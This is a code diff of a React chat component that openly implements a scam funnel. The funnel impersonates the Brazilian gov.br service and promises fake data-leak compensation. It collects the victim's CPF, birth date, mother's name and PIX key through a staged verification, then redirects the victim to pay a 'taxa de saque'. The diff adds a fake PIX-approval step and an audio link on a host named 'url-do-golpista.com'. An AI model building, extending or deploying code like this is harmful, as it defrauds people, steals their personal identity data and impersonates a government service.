@@ -17,8 +17,8 @@ export interface SimulatedChatParams {
   nome?: string;
   mae?: string;
   nascimento?: string;
-  typebotId?: string; // Kept for potential future use if switching back
-  apiHost?: string;   // Kept for potential future use
+  typebotId?: string;
+  apiHost?: string;
 }
 
 // Interfaces for flow step data types
@@ -51,7 +51,7 @@ interface FlowStepDataLoading {
 
 interface FlowStepDataDisplayMessage {
   title?: string;
-  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string; // Added _gov_style to match funnel
+  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
   message?: string;
   details?: Record<string, string>;
   audioUrl?: string;
@@ -61,19 +61,19 @@ interface FlowStepDataDisplayMessage {
 interface FlowStepDataTextInput {
   message: string;
   placeholder: string;
-  variableToSet: 'chavePix'; // Specific to this funnel's needs
-  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens'; // Basic validation types
+  variableToSet: 'chavePix';
+  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
 }
 
 interface FlowStepDataDisplayImage {
     message: string;
-    imageGenerationDetails?: { // For conceptual dynamic image generation
+    imageGenerationDetails?: {
         functionToCall: string;
         templateName: string;
-        inputs: Record<string, string>; // Values to overlay on template
-        outputVariable: string; // Variable to store generated image URL
+        inputs: Record<string, string>;
+        outputVariable: string;
     };
-    fallbackImageUrl: string; // Used if generation fails or not implemented
+    fallbackImageUrl: string;
     imageAiHint?: string;
     imageAltText?: string;
 }
@@ -84,7 +84,7 @@ interface FlowStep {
   data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage;
   nextStep?: string;
   nextAction?: 'play_video_then_proceed';
-  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>; // For actions like setting chavePix from userCPF
+  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
   isTerminal?: boolean;
 }
 
@@ -99,7 +99,6 @@ interface Message {
   displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
 }
 
-// The actual funnel definition based on the user's JSON structure
 const funnelDefinition = {
   "funnelName": "GovBR Indenização Scan Funnel",
   "description": "Funil para simular um serviço oficial do gov.br e coletar uma taxa de saque para uma suposta indenização por vazamento de dados.",
@@ -107,11 +106,11 @@ const funnelDefinition = {
     "visualTheme": "gov.br (usar paleta de cores, fontes e logo oficiais)",
     "botName": "Atendimento Gov.BR"
   },
-  "variables": { // These are conceptual; actual values managed by initialParams & flowVariables state
+  "variables": {
     "userName": { "description": "Nome completo do usuário." },
     "userCPF": { "description": "CPF do usuário." },
     "userBirthDate": { "description": "Data de nascimento do usuário." },
-    "motherName": { "description": "Nome da mãe do usuário." },
+    "motherName": { "description": "Nome da mãe do usuário (usado para falsa verificação)." },
     "chavePix": { "description": "A chave PIX informada pelo usuário.", "value": null },
     "indenizacaoValor": { "description": "Valor da indenização.", "value": "R$ 5.960,50" },
     "taxaValor": { "description": "Valor da taxa de saque.", "value": "R$ 61,90" },
@@ -125,25 +124,25 @@ const funnelDefinition = {
       "data": {
         "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
         "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro, assista ao vídeo abaixo para informações importantes e para iniciarmos seu atendimento. 👇",
-        "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4", // Using a real placeholder for now
+        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
         "thumbnailText": "Clique para Assistir e Iniciar"
       },
       "nextAction": "play_video_then_proceed" as const,
-      "nextStep": "step2_intro_message1"
+      "nextStep": "step1b_intro_message1"
     },
-    "step2_intro_message1": {
-        "type": "displayMessage" as const,
-        "data": {
-            "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
-        },
-        "nextStep": "step2_intro_message2"
+    "step1b_intro_message1": {
+      "type": "displayMessage" as const,
+      "data": {
+          "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
+      },
+      "nextStep": "step1c_intro_message2"
     },
-    "step2_intro_message2": {
-        "type": "displayMessage" as const,
-        "data": {
-            "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
-        },
-        "nextStep": "step2_mother_name_check"
+    "step1c_intro_message2": {
+      "type": "displayMessage" as const,
+      "data": {
+          "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
+      },
+      "nextStep": "step2_mother_name_check"
     },
     "step2_mother_name_check": {
       "type": "multipleChoice" as const,
@@ -244,7 +243,7 @@ const funnelDefinition = {
       "type": "loadingScreen" as const,
       "data": {
         "message": "Registrando sua chave PIX e gerando seu comprovante oficial de recebimento dos valores... Isso pode levar alguns instantes.",
-        "duration_ms": 4000 // Increased duration slightly
+        "duration_ms": 4000
       },
       "nextStep": "step5b_display_receipt"
     },
@@ -252,13 +251,13 @@ const funnelDefinition = {
       "type": "displayImage" as const,
       "data": {
         "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso e sua chave PIX **{{chavePix}}** está registrada para o recebimento de **{{indenizacaoValor}}**.",
-        "imageGenerationDetails": { // This part is conceptual for the JSON
+        "imageGenerationDetails": {
             "functionToCall": "generateReceiptImage",
             "templateName": "comprovante_template.png",
             "inputs": { "userName": "{{userName}}", "userCPF": "{{userCPF}}", "userBirthDate": "{{userBirthDate}}", "motherName": "{{motherName}}", "chavePix": "{{chavePix}}", "indenizacaoValor": "{{indenizacaoValor}}", "taxaValor": "{{taxaValor}}", "dataAtual": "{{dataAtual}}" },
             "outputVariable": "generatedReceiptImageUrl"
         },
-        "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização", // Actual image to display
+        "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização",
         "imageAiHint": "official government receipt document",
         "imageAltText": "Comprovante de Indenização Gov.BR"
       },
@@ -321,6 +320,21 @@ const funnelDefinition = {
             ]
         }
     },
+    "step10_pix_registered": {
+        "type": "displayMessage" as const,
+        "data": {
+          "title": "Chave PIX Cadastrada",
+          "icon": "success_checkmark_gov_style" as const,
+          "message": "Sua chave pix foi cadastrada com sucesso!",
+          "details": {
+            "Nome": "{{userName}}",
+            "Chave Pix": "{{chavePix}}",
+            "Status": "Aprovado"
+          },
+          "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
+        },
+        "nextStep": "step11_ask_generate_receipt"
+    },
     "step_end_no_payment": {
         "type": "displayMessage" as const,
         "data": {
@@ -336,7 +350,7 @@ const funnelDefinition = {
 
 const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
-  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep || "step1_video_hook");
+  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);
   const [isBotTyping, setIsBotTyping] = useState(true);
   const chatEndRef = useRef<HTMLDivElement>(null);
   const audioRef = useRef<HTMLAudioElement>(null);
@@ -344,9 +358,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
   const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
   const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
-  // Removed currentVideoUrl as video is now a placeholder in this version
-  // const [videoUrl, setVideoUrl] = useState<string | null>(null); // Keep if you plan to re-add video easily
-  const videoPlaceholderData = useRef<{title?: string; message?: string; thumbnailText?: string} | null>(null);
+  const videoPlaceholderData = useRef<{title?: string; message?: string; thumbnailText?: string; videoUrl?: string} | null>(null);
 
 
   const [isLoadingStep, setIsLoadingStep] = useState(false);
@@ -354,7 +366,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
   const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
   const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);
-  
+
   const [flowVariables, setFlowVariables] = useState<Record<string, any>>({
     indenizacaoValor: funnelDefinition.variables.indenizacaoValor.value,
     taxaValor: funnelDefinition.variables.taxaValor.value,
@@ -386,13 +398,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       const placeholder = `{{${key}}}`;
       if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
         let valueToInsert = String(allVars[key as keyof typeof allVars]);
-        
+
         if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
             valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
             // Already formatted
         }
-        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
+        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
             const datePart = valueToInsert.split('T')[0];
             const parts = datePart.split('-');
             if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
@@ -405,7 +417,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     }
     return formattedText;
   };
-  
+
   const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
     if (!details) return undefined;
     const formatted: Record<string, string> = {};
@@ -419,12 +431,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoPlaceholderData.current, isTextInputActive]);
 
+
   useEffect(() => {
     if (autoTransitionTimerRef.current) {
       clearTimeout(autoTransitionTimerRef.current);
       autoTransitionTimerRef.current = null;
     }
-    
+
     const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
     if (isNewStep) {
       prevCurrentStepKeyRef.current = currentStepKey;
@@ -434,15 +447,14 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       setCurrentDisplayMessage(null);
       setIsTextInputActive(false);
       setCurrentTextInputConfig(null);
-      
-      // Only clear video placeholder data if NOT transitioning TO a video step
+
       const nextStepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
       if (nextStepConfig?.type !== 'videoDisplay') {
         videoPlaceholderData.current = null;
         setCurrentVideoMessage(null);
       }
     }
-    
+
     setIsBotTyping(true);
 
     const processStep = async () => {
@@ -461,12 +473,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         case 'videoDisplay': {
           const data = stepConfig.data as FlowStepDataVideo;
           if (isNewStep) {
-            videoPlaceholderData.current = { title: data.title, message: data.message, thumbnailText: data.thumbnailText };
+            videoPlaceholderData.current = { title: data.title, message: data.message, thumbnailText: data.thumbnailText, videoUrl: data.videoUrl };
             setCurrentVideoMessage(formatText(data.title || data.message));
             setShowVideoThumbnailOverlay(true);
           }
           setIsBotTyping(false);
-          return; 
+          return;
         }
         case 'multipleChoice': {
           const data = stepConfig.data as FlowStepDataMultipleChoice;
@@ -545,7 +557,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                     setLoadingMessage(null);
                     setFlowVariables(prev => ({...prev, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                     setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", message: undefined, aiHint: data.imageAiHint || 'document image'});
-                    
+
                     if (stepConfig.nextStep) {
                         autoTransitionTimerRef.current = setTimeout(() => {
                              if (prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
@@ -582,12 +594,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           }, nextStepTransitionDelay);
       }
     };
-    
+
     const appearanceDelay = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type === 'loadingScreen' || (isNewStep && currentStepKey === funnelDefinition.initialStep) ) ? 0 : 700;
-    
+
     if (isNewStep || funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type === 'loadingScreen') {
         setTimeout(processStep, appearanceDelay);
-    } else { 
+    } else {
         setIsBotTyping(false);
     }
 
@@ -597,11 +609,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         autoTransitionTimerRef.current = null;
       }
     };
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [currentStepKey, initialParams]); // Removed flowVariables, prevCurrentStepKeyRef from deps for now to simplify
+  }, [currentStepKey, initialParams]);
 
   const handleOptionClick = (option: ChatOption) => {
-    setCurrentDisplayMessage(null); 
+    setCurrentDisplayMessage(null);
     setCurrentImageDetails(null);
 
     const currentStepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
@@ -612,25 +623,25 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
         const actionDetail = currentStepConfig.internalActions[option.action];
         if (actionDetail.type === 'setVariable') {
-            let valueFromSource = actionDetail.valueFrom; 
+            let valueFromSource = actionDetail.valueFrom;
             let valueToSet = "";
             if (valueFromSource === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF || "";
             else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource as keyof SimulatedChatParams] || "";
-            
+
             setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
         }
     }
 
     if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
         let finalPaymentUrl = formatText(option.paymentUrlTemplate);
-        
+
         const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
         const taxaValorNum = parseFloat(taxaValorCleaned);
         finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
-        
+
         const userNameEncoded = encodeURIComponent(initialParams.nome || flowVariables.userName || "");
         finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", userNameEncoded);
-        
+
         const userCPFNumbersOnly = (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, '');
         finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);
 
@@ -648,7 +659,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         return;
     }
-    
+
     if (option.nextStep) {
       if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
       setCurrentStepKey(option.nextStep);
@@ -656,16 +667,16 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         console.warn("Option clicked with no nextStep and no action:", option);
     }
   };
-  
+
   const handleVideoThumbnailClick = async () => {
     const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
     if (stepConfig?.type !== 'videoDisplay') return;
 
-    setShowVideoThumbnailOverlay(false); 
-    
-    if ((stepConfig as FlowStepVideo).nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
-      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); 
-      autoTransitionTimerRef.current = setTimeout(() => { 
+    setShowVideoThumbnailOverlay(false);
+
+    if ((stepConfig as FlowStep).nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
+      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
+      autoTransitionTimerRef.current = setTimeout(() => {
         if(prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
       }, 500);
     }
@@ -679,13 +690,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     }
 
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
-    
+
     if (currentTextInputConfig.variableToSet === 'chavePix') {
         setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
     }
 
-    setIsTextInputActive(false); 
-    setTextInputValue(""); 
+    setIsTextInputActive(false);
+    setTextInputValue("");
     const nextStep = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.nextStep;
     if (nextStep) {
         if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
@@ -753,7 +764,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
         </div>
       )}
-      
+
       {currentDisplayMessage && !isLoadingStep && (
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
@@ -793,7 +804,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 <div className="options-container">
                   {msg.options.map(opt => (
                     <button
-                      key={opt.text + opt.nextStep}
+                      key={opt.text + (opt.nextStep || '') + (opt.action || '')}
                       onClick={() => handleOptionClick(opt)}
                       className={`chat-option-button ${opt.style || ''}`}
                        dangerouslySetInnerHTML={{__html: opt.text}}
@@ -838,24 +849,25 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
         .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
         .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .bot-message { background-color: #e9ecef; color: #333; border-bottom-left-radius: 4px; } /* Grey for bot */
-        .user-message { background-color: #007bff; color: white; border-bottom-right-radius: 4px; } /* Blue for user */
+        .bot-message { background-color: #e9ecef; color: #333; border-bottom-left-radius: 4px; }
+        .user-message { background-color: #007bff; color: white; border-bottom-right-radius: 4px; }
         .user-message-container .user-message { margin-left: auto; }
-        
-        .options-container { 
-          margin-top: 10px; 
-          display: flex; 
-          flex-wrap: wrap; /* Allow buttons to wrap */
-          align-items: flex-start; 
-          gap: 8px; 
+
+        .options-container {
+          margin-top: 10px;
+          display: flex;
+          flex-wrap: wrap;
+          align-items: flex-start;
+          justify-content: flex-start; /* Align options to the left for bot messages */
+          gap: 8px;
         }
         .chat-option-button {
-          background-color: #007bff; 
+          background-color: #007bff;  /* Blue background for options */
           color: white;
           border: none;
-          padding: 10px 20px; 
-          border-radius: 25px; 
-          cursor: pointer; 
+          padding: 10px 20px;
+          border-radius: 25px; /* Pill shape */
+          cursor: pointer;
           font-size: 15px;
           font-weight: 500;
           transition: background-color 0.2s;
@@ -864,15 +876,16 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         .chat-option-button:hover { background-color: #0056b3; }
 
+        /* Gov style variants for specific buttons if needed */
         .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; border-color: #16a34a; color: white; font-weight: bold;}
         .chat-option-button.primary_cta_button_gov_style:hover { background-color: #15803d; border-color: #15803d; color: white; }
-        
+
         .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #007bff; text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
         .chat-option-button.secondary_link_button_gov_style:hover { color: #0056b3; background-color: transparent; }
 
         .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc3545; text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
         .chat-option-button.destructive_link_button_gov_style:hover { color: #c82333; background-color: transparent; }
-        
+
         .typing-indicator { display: inline-flex; align-items: center; padding: 10px 15px; }
         .typing-indicator .dot { width: 8px; height: 8px; margin: 0 2px; background-color: #aaa; border-radius: 50%; animation: bounce 1.4s infinite; }
         .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
@@ -890,4 +903,3 @@ export default SimulatedChatFlow;
 interface FlowStepVideo extends FlowStep { type: 'videoDisplay'; data: FlowStepDataVideo; nextAction: 'play_video_then_proceed'; }
 interface FlowStepMultipleChoice extends FlowStep { type: 'multipleChoice'; data: FlowStepDataMultipleChoice; }
 // ... and so on for other types if needed for stricter type checking in switch cases.
-
